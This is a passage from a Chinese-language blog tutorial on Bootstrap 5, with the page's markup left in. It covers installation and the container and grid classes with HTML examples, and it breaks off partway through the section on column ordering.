                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读32分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">什么是Bootstrap</h2>
<p>Bootstrap 是一个用于快速开发Web应用程序和网站的前端框架，Bootstrap是前端开发中比较受欢迎的框架，简洁且灵活，它基于HTML、CSS和JavaScript。Bootscript将HTML、CSS和JavaScript中不同的应用场景封装成了一个一个的功能组件，用起来简洁灵活，使得Web开发更加快捷。</p>
<ul>
<li><strong>浏览器兼容性</strong>：Bootstrap在大多数浏览器都能够正常显示和运行的，只有极少数浏览器或者低版本浏览器不适配具体可在Bootstrap官网查看</li>
</ul>
<p>本文参考Bootstrap5来进行介绍，Bootstrap5利用Sass变量和大量的mixin、响应式布局、可扩展的预制组件、基于jQuery的强大插件系统，能够快速为我们开发出原型或者构建整个app。</p>
<h2 data-id="heading-1">Bootstrap安装</h2>
<p>Bootstrap提供了很多中安装方式，官网直接下载生产文件、node.js进行安装等等方式。</p>
<h3 data-id="heading-2">官网下载Bootstrap</h3>
<p>Bootstrap官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fv5.bootcss.com%2Fdocs%2Fgetting-started%2Fdownload%2F" target="_blank" title="https://v5.bootcss.com/docs/getting-started/download/" ref="nofollow noopener noreferrer">v5.bootcss.com/docs/gettin…</a></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da354b1d6bc940c8a20bc7fff37e39f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=W2u6Rb0mszT8ay99gxK%2B4TiCwaQ%3D" alt="" loading="lazy"/></p>
<p>下载了Bootstrap后我们需要进行解压缩，解压缩后我们就可以看到Bootstrap的 css 和 js 文件，在这两个目录中我们只需要分别引入 css 目录中的<code>&lt;font style="color:rgb(214, 51, 132);"&gt;bootstrap.min.css&lt;/font&gt;</code>和 js 目录中的<code>&lt;font style="color:rgb(214, 51, 132);"&gt;bootstrap.bundle.min.js&lt;/font&gt;</code>就行了。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Polaris<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"./css/bootstrap.min.css"</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text-primary-emphasis text-bg-warning"</span>&gt;</span>Hello Bootstrap!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./js/bootstrap.bundle.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">通过node来安装Bootstrap</h3>
<p>Bootstrap还提供了node安装方法我们只需要在对于的命令行中输入 <code>npm install bootstrap</code>，注意Bootstrap是基于 sass 的我们还需要安装 sass(<code>npm install sass</code>) 来确保我们的所需的样式没有任何问题。</p>
<pre><code class="hljs language-plain" lang="plain">npm install bootstrap sass
</code></pre>
<p>然后我们在对于的文件中引入我们的Bootstrap文件即可。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./style.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"bootstrap"</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">"bootstrap/dist/css/bootstrap.min.css"</span>

<span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>).<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h2 data-id="heading-4">Bootstrap 容器</h2>
<p>容器是Bootstrap中最基本的布局元素，它包含、填充和对齐给定设备或视口中的内容。Bootstrap提供了三种不同的容器：</p>
<ul>
<li><code>.container</code>：它用于固定宽度并支持响应式布局。</li>
<li><code>.container-{breakpoint}</code>：它占据100%的宽度，直到breakpoint为止。</li>
<li><code>.container-fluid</code>：它占据全部视口的容器。</li>
</ul>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bf04c2eca9e242e4a8538a3d6efac9cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=Ft9oxrp42CIke5ZSp5EuFl05KAY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">默认容器 cantainer</h3>
<p>默认容器 cantainer 是一个响应式、固定宽度的容器，它会在每一个断点处发生变化，使我们的容器能够适应不同的环境。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>这是container<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h3 data-id="heading-6">响应式容器 cantainer-{xxx}</h3>
<p>响应式容器允许你指定一个类，在到达指定类之前宽度为100%，之后宽度会随着断点的更改更换不同的宽度。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container-xxl"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>这是container-xxl<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h3 data-id="heading-7">液体容器 cantainer-fluid</h3>
<p>液体容器用作全宽容器，不管断点如何更改始终占据100%宽度。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container-fluid"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>这是container-fluid<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<h2 data-id="heading-8">Bootstrap 网格</h2>
<p>Bootstrap 的网格系统使用一系列的列容器、行和列来布局和对齐内容，它基于Flexbox构建。网格系统每行提供12个模板列，我们可以创建跨越任意列数的各种元素组合。列类指示要跨越的模板列数。</p>
<h3 data-id="heading-9">网格选项</h3>
<p>Bootstrap 的网格系统可以适配所有六个默认断点以及我们自定义的任何断点，六个默认网格层级如下：</p>
<ul>
<li>特小号 (XS)</li>
<li>小号 (sm)</li>
<li>中等 (md)</li>
<li>大号 (lg)</li>
<li>特大号 (XL)</li>
<li>特大号 (XXL)</li>
</ul>
<p>如上所述，每一个断点都有其自身的容器、唯一类前缀和修饰符，以下是网格在这些断点处变化的情况：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53f400ae7b3c48edaeec800a7f61b087~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=Tb5ohGPBE8Vqy7fwJj98TbFkFsw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">响应式类</h3>
<p>Bootstrap 的网格系统包含六层预定义的类，用于构建复杂的响应式布局。您可以根据需要，在超小、小、中、大或超大设备上自定义列的大小。</p>
<h3 data-id="heading-11">等宽</h3>
<p>我们可以根据需要为每一个断点添加任意数量的无单位类，这样每列的宽度都会相同。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container  mt-10"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row text-center"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
            1/3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-6"</span>&gt;</span>
            1/3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
            1/3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container mt-10"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row text-center"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>上面代码效果就是将第一行每列占据 1 / 3 的比例来显示，第二行每列占据 1 / 4 来显示。效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b2fb090931ec4040bc3f8fea68a28f5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=qDa9Wfwnu8Kz46iDPYafe1ZGqq4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">设置列宽</h3>
<p>Bootstrap 除了上述的列等宽，我们还可以对某一列进行单独的设置大小，其他列会随着某一列的调整自动改变它的大小。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container  mt-10"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row text-center"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-2"</span>&gt;</span>
            1/3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-8"</span>&gt;</span>
            2/3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-2"</span>&gt;</span>
            1/3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>上面代码效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d3ef0531b8a446f81f294bb88f31d80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=NVDP%2Fet0aggLAAW9PDPhg2KQkUs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">可变宽度内容</h3>
<p>Bootstrap 还可以通过 <code>col-{xxx}-auto</code>类来根据内容的自然宽度调整列宽。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container  mt-10"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row text-center"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col col-lg-2"</span>&gt;</span>
            1/3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-md-auto"</span>&gt;</span>
            根据内容调整宽度
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col col-lg-2"</span>&gt;</span>
            1/3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09cc126ceea8425899659ee1e3030524~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=tCNy9yuoUSt8Zvgwx7Ku02vjGHU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">堆叠至水平</h3>
<p>我们可以使用 <code>.col-{xxx}-*</code> 来设置到某一个断点后布局变为水平。此次我们用 <code>.col-lg-*</code> 类来举例，当我们视口小于992px时布局会变为水平</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container  mt-10"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row text-center"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-lg-4"</span>&gt;</span>
            第一份
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-lg-4"</span>&gt;</span>
            第二份
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-lg-4"</span>&gt;</span>
            第三份
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/940f28bfefd341fcaf5e07fff4943539~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=2jAjneHbpknX2oYhGdNFsECdeHQ%3D" alt="" loading="lazy"/></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60a3017847d64848bd236d3f0b1f3e30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=LWh3GTdzA853ZTPYg7TIqHhOK20%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-15">混搭</h3>
<p>我们还可以通过设置多个类来实现在不同的断点中展现出不同的效果，此处还是拿 <code>.col-lg-*</code>来举例。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container mt-10"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row text-center"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-6 col-lg-3"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-6 col-lg-3"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-6 col-lg-3"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-6 col-lg-3"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>在我们视口大于992px时我们每一个列宽是占据 1 / 4的，效果如下:</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49858f55cd8e469094070373d8e8efec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=YhdgdT86N4eW0kzrX9MQojVgVtM%3D" alt="" loading="lazy"/></p>
<p>当我们视口小于992px时我们的列宽会变成 1 / 2的宽度，效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd3a3de01d7f40b89e5d14d8b48e68d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=UDhsyDHyx30GHsBx4Kle2v2%2Bd3c%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-16">行列</h3>
<p>我们还可以通过<code>.row-cols-*</code>类来快速的设置最适合我们内容和布局的列数。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container mt-10"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row text-center row-cols-2  "</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
            1/4
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c4ddda473d24e01a18175a5d6192dbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=F0K7KcJz5%2BkZW870lDinOUbgNMs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-17">偏移列</h3>
<p>在各种为沾满整个视口使，我们想让格子中有一个的距离我们就可以使用<code>offset-*-*</code>来设置偏移多少个格子。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container mt-10"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row text-center row-cols-3  "</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-3"</span>&gt;</span>
            col-3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col-5 offset-2"</span>&gt;</span>
            col-5
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b32d2f808e8143c1a917edf5715c2e62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=UVJ7ygIk9bAuJ6UZTfs4hnshCXI%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-18">排序</h3>
<p>在网格中我们想让后面的网格显示到我们网格最前面，我们就可以通过<code>order-*</code>来进行设置，但是我们的排序数字是 1-5 这个区间还支持 <code>order-first</code> 和 <code>order-last</code>，且 <code>order-first</code>和 <code>orde-last</code>的优先级高于数字区间。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container mt-10"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"row text-center row-cols-3  "</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col"</span>&gt;</span>
            1
